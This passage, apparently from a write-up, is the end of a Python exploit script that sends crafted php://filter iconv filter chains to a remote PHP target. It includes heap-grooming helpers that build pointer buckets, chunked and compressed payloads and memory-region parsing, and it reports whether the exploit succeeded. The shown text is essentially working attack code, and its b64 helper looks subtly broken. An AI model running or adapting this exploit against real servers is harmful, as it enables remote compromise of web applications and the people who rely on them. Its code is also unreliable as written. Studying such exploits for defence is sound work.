        path = f"php://filter/read={filters}/resource={resource}"

        # return path
        return f"/read={filters}", resource

    @inform("Triggering...")
    def exploit(self) -> None:
        # path = self.build_exploit_path()
        filters, content = self.build_exploit_path()
        start = time.time()

        try:
            # self.remote.send(path)
            self.remote.iconv(filters, content)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
~~~

![image-20260301135448097](https://gitee.com/bobrocket/img/raw/master/img/image-20260301135448097.png)
